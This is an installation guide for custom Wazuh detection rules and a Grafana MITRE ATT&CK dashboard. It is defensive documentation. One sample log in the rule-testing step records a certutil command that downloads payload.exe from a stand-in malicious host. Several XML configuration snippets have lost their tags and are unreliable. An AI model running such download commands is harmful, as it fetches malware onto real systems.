# Installation Guide - Wazuh SIEM Enhancement

Complete step-by-step guide for deploying custom detection rules and advanced threat visualization dashboard.

## 📋 Table of Contents

1. [Prerequisites](#prerequisites)
2. [Architecture Overview](#architecture-overview)
3. [Installation Steps](#installation-steps)
4. [Configuration](#configuration)
5. [Verification](#verification)
6. [Troubleshooting](#troubleshooting)
7. [Upgrade Guide](#upgrade-guide)

---

## Prerequisites

### System Requirements

**Wazuh Manager Server**
- **OS**: Ubuntu 20.04/22.04, CentOS 7/8, RHEL 7/8, Debian 10/11
- **CPU**: 4 cores minimum (8 cores recommended)
- **RAM**: 8GB minimum (16GB recommended for >1000 agents)
- **Disk**: 50GB minimum (SSD recommended for Elasticsearch)
- **Network**: Ports 1514, 1515, 55000, 9200, 3000 accessible

**Software Versions**
- Wazuh Manager: **4.8.0 or higher** (required for ATT&CK integration)
- Elasticsearch: **7.10.2 or higher**
- Kibana: **7.10.2 or higher**
- Grafana: **9.0 or higher**

**Permissions**
- Root/sudo access to Wazuh manager
- Access to modify Wazuh configuration files
- Ability to restart Wazuh services

### Verification Commands

```bash
# Check Wazuh version
/var/ossec/bin/wazuh-control info

# Check Elasticsearch
curl -X GET "localhost:9200"

# Check Grafana
systemctl status grafana-server
```

---

## Architecture Overview

```
┌─────────────────────────────────────────────────┐
│          WAZUH AGENTS (Data Sources)            │
│  Windows Servers, Linux Hosts, Workstations     │
└────────────────────┬────────────────────────────┘
                     │ Port 1514/1515
                     ▼
┌─────────────────────────────────────────────────┐
│           WAZUH MANAGER (Detection)             │
│  /var/ossec/etc/rules/                          │
│  ├── local_rules.xml (existing)                 │
│  └── custom_detection_rules.xml (NEW)           │
│                                                  │
│  Detection Engine processes logs with:          │
│  • 33 custom rules                              │
│  • MITRE ATT&CK tagging                         │
│  • Alert enrichment                             │
└────────────────────┬────────────────────────────┘
                     │ Port 9200
                     ▼
┌─────────────────────────────────────────────────┐
│          ELASTICSEARCH (Storage)                │
│  Index: wazuh-alerts-*                          │
│  • Alert data with ATT&CK metadata              │
│  • Optimized for dashboard queries              │
└────────────────────┬────────────────────────────┘
                     │ Port 9200
                     ▼
┌─────────────────────────────────────────────────┐
│            GRAFANA (Visualization)              │
│  Dashboard: Wazuh-MITRE-ATT&CK-Advanced         │
│  • 50+ panels across 5 sections                 │
│  • Real-time threat visualization               │
│  • Automated risk scoring                       │
└─────────────────────────────────────────────────┘
```

---

## Installation Steps

### Step 1: Backup Existing Configuration

**Always backup before making changes!**

```bash
# Navigate to Wazuh directory
cd /var/ossec/etc

# Backup current rules
sudo cp rules/local_rules.xml rules/local_rules.xml.backup.$(date +%Y%m%d)

# Backup ossec.conf
sudo cp ossec.conf ossec.conf.backup.$(date +%Y%m%d)

# Verify backups created
ls -lh rules/*.backup* ossec.conf.backup*
```

### Step 2: Clone Repository

```bash
# Clone to temporary location
cd /tmp
git clone https://github.com/yourusername/wazuh-siem-enhancement.git
cd wazuh-siem-enhancement

# Verify repository structure
ls -la
# Expected: rules/, dashboards/, docs/, scripts/, test_cases/
```

### Step 3: Deploy Detection Rules

#### Option A: Manual Deployment (Recommended)

```bash
# Copy custom rules to Wazuh rules directory
sudo cp rules/custom_detection_rules.xml /var/ossec/etc/rules/

# Set correct ownership
sudo chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml

# Set correct permissions
sudo chmod 640 /var/ossec/etc/rules/custom_detection_rules.xml

# Verify file copied correctly
sudo ls -lh /var/ossec/etc/rules/custom_detection_rules.xml
```

#### Option B: Automated Deployment Script

```bash
# Make script executable
chmod +x scripts/deploy_rules.sh

# Run deployment script
sudo ./scripts/deploy_rules.sh

# Script will:
# - Backup existing rules
# - Copy new rules
# - Set permissions
# - Validate syntax
# - Restart Wazuh manager
```

### Step 4: Update Wazuh Configuration

Edit Wazuh configuration to include new rules:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Locate the `<ruleset>` section and add:

```xml

  
  ruleset/decoders
  ruleset/rules
  0215-policy_rules.xml
  etc/lists/audit-keys

  
  local_rules.xml
  
  
  custom_detection_rules.xml
  

```

Save and exit (Ctrl+X, Y, Enter in nano).

### Step 5: Validate Rule Syntax

Before restarting, validate that rules are syntactically correct:

```bash
# Test rule syntax
sudo /var/ossec/bin/wazuh-logtest -t

# If successful, you'll see: "wazuh-logtest: INFO: Total rules enabled: XXXX"
# Check that count increased by 33 rules

# Test with sample log entry
echo '2025-10-24 10:30:45 WinEvtLog: Security: AUDIT_SUCCESS(4688): Microsoft-Windows-Security-Auditing: (no user): no domain: WIN-SERVER: New Process Created. Creator Process Name: C:\Windows\System32\cmd.exe New Process Name: C:\Windows\System32\certutil.exe Command Line: certutil.exe -urlcache -split -f http://malicious.com/payload.exe' | sudo /var/ossec/bin/wazuh-logtest

# Expected output: Should trigger rule 100100 (Certutil download)
```

### Step 6: Restart Wazuh Manager

```bash
# Restart Wazuh manager to load new rules
sudo systemctl restart wazuh-manager

# Verify service started successfully
sudo systemctl status wazuh-manager

# Check for any errors in logs
sudo tail -f /var/ossec/logs/ossec.log

# Should see: "INFO: Reading configuration file: /var/ossec/etc/ossec.conf"
# Should see: "INFO: Started ."
```

### Step 7: Configure Grafana Datasource

If not already configured:

```bash
# Access Grafana web interface
# URL: http://your-server-ip:3000
# Default credentials: admin / admin (change on first login)

# Navigate to: Configuration (⚙️) → Data Sources → Add data source

# Select: Elasticsearch

# Configure:
Name: Wazuh-Alerts
URL: http://localhost:9200
Index name: wazuh-alerts-*
Time field name: timestamp
Version: 7.10+
Min time interval: 10s

# Click "Save & Test"
# Should see: "Data source is working"
```

### Step 8: Import Grafana Dashboard

```bash
# In Grafana web interface:
# Navigate to: Dashboards (📊) → Import

# Click: "Upload JSON file"
# Select: dashboards/wazuh-mitre-attack-advanced-threat-analysis.json

# Configure:
Name: Wazuh - MITRE ATT&CK Advanced Threat Analysis
Folder: (Select or create "Wazuh Dashboards")
UID: wazuh-mitre-attack-advanced (auto-generated)

# Select Datasource: Wazuh-Alerts (configured in Step 7)

# Click: Import

# Dashboard should load with all 50+ panels
```

### Step 9: Configure Dashboard Variables (Optional)

Customize dashboard behavior:

```bash
# In dashboard, click: Dashboard settings (⚙️) → Variables

# Default variables:
# - $timeFilter: Auto (dashboard time range)
# - $agent: All agents (dropdown filter)
# - $severity: All severities (filter)

# Customize refresh rate:
# Dashboard settings → General → Auto refresh
# Recommended: 30s for live monitoring
```

---

## Configuration

### Agent Configuration

Ensure Windows agents have proper event log collection:

```xml



  
    Security
    eventchannel
  
  
  
    System
    eventchannel
  
  
  
  
    Microsoft-Windows-PowerShell/Operational
    eventchannel
  
  
  
  
    Microsoft-Windows-Sysmon/Operational
    eventchannel
  

```

Restart agent after configuration:

```powershell
# On Windows
Restart-Service -Name wazuh

# Verify
Get-Service -Name wazuh
```

### Elasticsearch Index Optimization

For improved dashboard performance:

```bash
# Increase refresh interval for wazuh-alerts indices
curl -X PUT "localhost:9200/wazuh-alerts-*/_settings" -H 'Content-Type: application/json' -d'
{
  "index": {
    "refresh_interval": "30s"
  }
}'

# Verify settings
curl -X GET "localhost:9200/wazuh-alerts-*/_settings?pretty"
```

### Alert Level Tuning

Adjust rule severity if needed:

```xml



  
  

```

---

## Verification

### Step 1: Verify Rules Loaded

```bash
# Check rule count
sudo /var/ossec/bin/wazuh-logtest -t | grep "Total rules enabled"

# Expected increase: +33 rules from baseline

# List custom rules
sudo grep -n "id=\"1001" /var/ossec/etc/rules/custom_detection_rules.xml | wc -l
# Expected: 33
```

### Step 2: Generate Test Alerts

Use provided test cases:

```bash
# Navigate to test cases
cd /tmp/wazuh-siem-enhancement/test_cases

# Test LOLBin detection
cat lolbin_test_logs.txt | sudo /var/ossec/bin/wazuh-logtest

# Expected: Rules 100100-100111 should trigger

# Test fileless detection
cat fileless_test_logs.txt | sudo /var/ossec/bin/wazuh-logtest

# Expected: Rules 100200-100209 should trigger
```

### Step 3: Verify Alerts in Elasticsearch

```bash
# Check recent alerts
curl -X GET "localhost:9200/wazuh-alerts-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {
    "range": {
      "timestamp": {
        "gte": "now-1h"
      }
    }
  },
  "size": 5,
  "sort": [{"timestamp": "desc"}]
}'

# Look for alerts with rule.id starting with 1001XX
```

### Step 4: Verify Dashboard Display

```bash
# Access dashboard in Grafana
# Navigate to: Wazuh - MITRE ATT&CK Advanced Threat Analysis

# Verify each section loads:
1. Overview & Statistics - Should show total alerts
2. LOLBins Detection - Should populate if test logs generated
3. Fileless Malware - Should show PowerShell activity
4. APT Detection - Risk scoring table should render
5. Attack Chain Timeline - Should display temporal progression

# Check panel queries execute without errors (F12 browser console)
# Expected: No red error messages in Grafana UI
```

### Step 5: Performance Verification

```bash
# Test dashboard query performance
# In Grafana, open Query Inspector on any panel
# Click: Panel Title → Inspect → Query

# Verify:
# - Query execution time < 5 seconds
# - No timeout errors
# - Data returned successfully

# For large datasets (>10K alerts), optimize:
curl -X PUT "localhost:9200/wazuh-alerts-*/_settings" -H 'Content-Type: application/json' -d'
{
  "index": {
    "max_result_window": 20000
  }
}'
```

---

## Troubleshooting

### Issue 1: Rules Not Loading

**Symptom**: Rule count doesn't increase after deployment

**Diagnosis**:
```bash
# Check for syntax errors
sudo /var/ossec/bin/wazuh-logtest -t

# Check ossec.conf includes custom rules
sudo grep "custom_detection_rules.xml" /var/ossec/etc/ossec.conf

# Check file permissions
ls -l /var/ossec/etc/rules/custom_detection_rules.xml
# Should be: -rw-r----- wazuh wazuh
```

**Solution**:
```bash
# Fix permissions
sudo chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml
sudo chmod 640 /var/ossec/etc/rules/custom_detection_rules.xml

# Ensure ossec.conf includes the file
sudo nano /var/ossec/etc/ossec.conf
# Add: custom_detection_rules.xml

# Restart manager
sudo systemctl restart wazuh-manager
```

### Issue 2: Dashboard Panels Empty

**Symptom**: Dashboard loads but panels show "No data"

**Diagnosis**:
```bash
# Check Elasticsearch connectivity
curl -X GET "localhost:9200/_cluster/health?pretty"

# Check indices exist
curl -X GET "localhost:9200/_cat/indices/wazuh-alerts-*?v"

# Check recent alerts exist
curl -X GET "localhost:9200/wazuh-alerts-*/_count?pretty"
```

**Solution**:
```bash
# If no alerts:
# 1. Generate test alerts (see Step 2 of Verification)
# 2. Check agents are connected:
/var/ossec/bin/agent_control -l

# If alerts exist but panels empty:
# 1. Verify datasource configuration in Grafana
# 2. Check time range (top-right in dashboard)
# 3. Adjust to "Last 24 hours" or "Last 7 days"

# Refresh dashboard
# Click: Dashboard settings → Refresh (or press Ctrl+R)
```

### Issue 3: High False Positive Rate

**Symptom**: Too many alerts for legitimate activity

**Diagnosis**:
```bash
# Identify noisy rules
curl -X GET "localhost:9200/wazuh-alerts-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "size": 0,
  "aggs": {
    "by_rule": {
      "terms": {
        "field": "rule.id",
        "size": 20
      }
    }
  }
}'

# Check which rule IDs have highest counts
```

**Solution**:
```xml

<!-- Edit /var/ossec/etc/rules/custom_detection_rules.xml -->


  
  
  
  ^SYSTEM$
  negate



  
  



```

### Issue 4: Performance Degradation

**Symptom**: Dashboard slow to load, queries timeout

**Diagnosis**:
```bash
# Check Elasticsearch cluster health
curl -X GET "localhost:9200/_cluster/health?pretty"
# Look for: "status": "yellow" or "red"

# Check index sizes
curl -X GET "localhost:9200/_cat/indices/wazuh-alerts-*?v&h=index,docs.count,store.size&s=store.size:desc"

# Check query performance in Grafana Query Inspector
```

**Solution**:
```bash
# Solution 1: Optimize indices
curl -X POST "localhost:9200/wazuh-alerts-*/_forcemerge?max_num_segments=1"

# Solution 2: Implement index lifecycle management
# Delete old indices
curl -X DELETE "localhost:9200/wazuh-alerts-4.x-2024.08.*"

# Solution 3: Increase Elasticsearch heap
sudo nano /etc/elasticsearch/jvm.options
# Set: -Xms4g -Xmx4g (half of available RAM, max 32GB)

# Restart Elasticsearch
sudo systemctl restart elasticsearch

# Solution 4: Reduce dashboard refresh rate
# In dashboard: Auto-refresh → 1m or 5m instead of 30s
```

### Issue 5: MITRE ATT&CK Tags Not Appearing

**Symptom**: Alerts generated but no ATT&CK technique IDs

**Diagnosis**:
```bash
# Check alert structure
curl -X GET "localhost:9200/wazuh-alerts-*/_search?pretty" -H 'Content-Type: application/json' -d'
{
  "query": {"match": {"rule.id": "100100"}},
  "size": 1
}'

# Look for: "rule.mitre.id" and "rule.mitre.tactic" fields
```

**Solution**:
```bash
# Ensure Wazuh version 4.8+
/var/ossec/bin/wazuh-control info

# If < 4.8, upgrade Wazuh:
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" | sudo tee /etc/apt/sources.list.d/wazuh.list
sudo apt-get update
sudo apt-get install wazuh-manager

# Verify rules include MITRE tags
sudo grep -A 5 "rule id=\"100100\"" /var/ossec/etc/rules/custom_detection_rules.xml
# Should see: T1105
```

### Issue 6: Grafana Datasource Connection Failed

**Symptom**: "Data source is working" test fails

**Diagnosis**:
```bash
# Check Elasticsearch is running
sudo systemctl status elasticsearch

# Check Elasticsearch is accessible
curl -X GET "localhost:9200"

# Check Grafana can reach Elasticsearch
sudo netstat -tlnp | grep 9200
```

**Solution**:
```bash
# If Elasticsearch not running
sudo systemctl start elasticsearch
sudo systemctl enable elasticsearch

# If firewall blocking
sudo ufw allow 9200/tcp

# Configure Grafana datasource with correct URL
# Grafana → Configuration → Data Sources
# URL: http://localhost:9200 (if on same host)
# URL: http://:9200 (if remote)

# Test connection
curl -X GET "http://localhost:9200/_cluster/health?pretty"
```

---

## Upgrade Guide

### Upgrading from Previous Versions

#### From 0.9.0 (Beta) to 1.0.0

```bash
# Backup current deployment
cd /var/ossec/etc
sudo cp -r rules rules.backup.pre-1.0.0
cd /tmp/wazuh-siem-enhancement
git checkout v0.9.0
cp -r dashboards dashboards.backup.pre-1.0.0

# Pull latest version
git fetch --all --tags
git checkout tags/v1.0.0

# Deploy updated rules
sudo cp rules/custom_detection_rules.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml

# Restart Wazuh
sudo systemctl restart wazuh-manager

# Update dashboard (replaces existing)
# Grafana → Dashboard → Import
# Select: dashboards/wazuh-mitre-attack-advanced-threat-analysis.json
# Choose: "Update" existing dashboard
```

**Breaking Changes in 1.0.0**:
- None (backward compatible)

**New Features**:
- +8 additional detection rules (25 → 33)
- Enhanced risk scoring algorithm
- Attack chain timeline visualization
- Performance optimizations

#### Rollback Procedure

If issues occur:

```bash
# Restore previous rules
sudo cp /var/ossec/etc/rules.backup.pre-1.0.0/custom_detection_rules.xml /var/ossec/etc/rules/

# Restart Wazuh
sudo systemctl restart wazuh-manager

# Restore previous dashboard
# Re-import backup JSON from dashboards.backup.pre-1.0.0/

# Report issue on GitHub
```

---

## Advanced Configuration

### Multi-Server Deployment

For distributed Wazuh deployments:

```bash
# Deploy rules on all Wazuh manager nodes
for server in manager1 manager2 manager3; do
  scp rules/custom_detection_rules.xml root@$server:/var/ossec/etc/rules/
  ssh root@$server "chown wazuh:wazuh /var/ossec/etc/rules/custom_detection_rules.xml"
  ssh root@$server "systemctl restart wazuh-manager"
done

# Configure Grafana to query all Elasticsearch nodes
# Use Elasticsearch cluster endpoint or load balancer
```

### High Availability Setup

```bash
# Configure multiple Elasticsearch data nodes
# Edit /etc/elasticsearch/elasticsearch.yml on each node:

cluster.name: wazuh-cluster
node.name: node-1  # Change per node
network.host: 0.0.0.0
discovery.seed_hosts: ["node1-ip", "node2-ip", "node3-ip"]
cluster.initial_master_nodes: ["node-1", "node-2", "node-3"]

# Restart Elasticsearch on all nodes
sudo systemctl restart elasticsearch

# Update Grafana datasource to use cluster endpoint
```

### Custom Rule Development

To add your own detection rules:

```xml



  
  
    PARENT_RULE_ID
    your_pattern_here
    Your custom threat detection description
    
      T1XXX.XXX
    
    attack.tactic_name,custom_category,
  


```

Test new rule:

```bash
# Validate syntax
sudo /var/ossec/bin/wazuh-logtest -t

# Test with sample log
echo "your_sample_log_here" | sudo /var/ossec/bin/wazuh-logtest

# Restart if successful
sudo systemctl restart wazuh-manager
```

---

## Security Considerations

### Secure Communication

```bash
# Enable TLS for Elasticsearch
# Edit /etc/elasticsearch/elasticsearch.yml:
xpack.security.enabled: true
xpack.security.transport.ssl.enabled: true

# Update Grafana datasource to use HTTPS
# URL: https://localhost:9200
# Skip TLS Verification: false (use valid certs)
```

### Access Control

```bash
# Restrict Grafana dashboard access
# Grafana → Configuration → Users and Access
# Create role: "SOC Analyst" with read-only dashboard access

# Restrict Wazuh API access
sudo nano /var/ossec/api/configuration/api.yaml
# Configure authentication and RBAC
```

### Audit Logging

```bash
# Enable Grafana audit logging
# Edit /etc/grafana/grafana.ini:
[log]
mode = console file
level = info

[auditing]
enabled = true
log_dashboard_access = true

# Restart Grafana
sudo systemctl restart grafana-server
```

---

## Post-Installation Checklist

- [ ] Detection rules deployed (33 rules)
- [ ] Wazuh manager restarted successfully
- [ ] Test alerts generated and verified
- [ ] Grafana datasource configured
- [ ] Dashboard imported and loading
- [ ] All 5 dashboard sections populated
- [ ] Query performance acceptable (<5s)
- [ ] No errors in Wazuh logs
- [ ] No errors in Elasticsearch logs
- [ ] Backup of original configuration created
- [ ] Documentation reviewed
- [ ] Team trained on dashboard usage

---

## Next Steps

After successful installation:

1. **Baseline Normal Activity**: Monitor for 1-2 weeks to understand baseline
2. **Tune False Positives**: Adjust rules based on environment
3. **Create Response Playbooks**: Document procedures for each alert type
4. **Schedule Regular Reviews**: Weekly dashboard review with security team
5. **Plan Upgrades**: Subscribe to repository updates

---

## Support Resources

- **Documentation**: [GitHub Wiki](https://github.com/yourusername/wazuh-siem-enhancement/wiki)
- **Issues**: [GitHub Issues](https://github.com/yourusername/wazuh-siem-enhancement/issues)
- **Discussions**: [GitHub Discussions](https://github.com/yourusername/wazuh-siem-enhancement/discussions)
- **Wazuh Community**: [Google Groups](https://groups.google.com/g/wazuh)

---

## Appendix: Complete Installation Script

For automated deployment:

```bash
#!/bin/bash
# complete_installation.sh

set -e

echo "=== Wazuh SIEM Enhancement - Complete Installation ==="

# Variables
WAZUH_DIR="/var/ossec"
RULES_DIR="$WAZUH_DIR/etc/rules"
BACKUP_DIR="$RULES_DIR/backup.$(date +%Y%m%d_%H%M%S)"

# Step 1: Backup
echo "[1/6] Creating backups..."
mkdir -p "$BACKUP_DIR"
cp "$RULES_DIR/local_rules.xml" "$BACKUP_DIR/"
cp "$WAZUH_DIR/etc/ossec.conf" "$BACKUP_DIR/"

# Step 2: Deploy rules
echo "[2/6] Deploying custom detection rules..."
cp rules/custom_detection_rules.xml "$RULES_DIR/"
chown wazuh:wazuh "$RULES_DIR/custom_detection_rules.xml"
chmod 640 "$RULES_DIR/custom_detection_rules.xml"

# Step 3: Update configuration
echo "[3/6] Updating ossec.conf..."
if ! grep -q "custom_detection_rules.xml" "$WAZUH_DIR/etc/ossec.conf"; then
    sed -i '/<\/ruleset>/i\  custom_detection_rules.xml<\/include>' "$WAZUH_DIR/etc/ossec.conf"
fi

# Step 4: Validate
echo "[4/6] Validating rule syntax..."
/var/ossec/bin/wazuh-logtest -t

# Step 5: Restart
echo "[5/6] Restarting Wazuh manager..."
systemctl restart wazuh-manager

# Step 6: Verify
echo "[6/6] Verifying deployment..."
sleep 5
systemctl status wazuh-manager --no-pager

echo "=== Installation Complete ==="
echo "Backup location: $BACKUP_DIR"
echo "Next: Import Grafana dashboard from dashboards/"
```

Save and run:

```bash
chmod +x complete_installation.sh
sudo ./complete_installation.sh
```

---

**Installation complete! Proceed to dashboard user guide for analyst training.**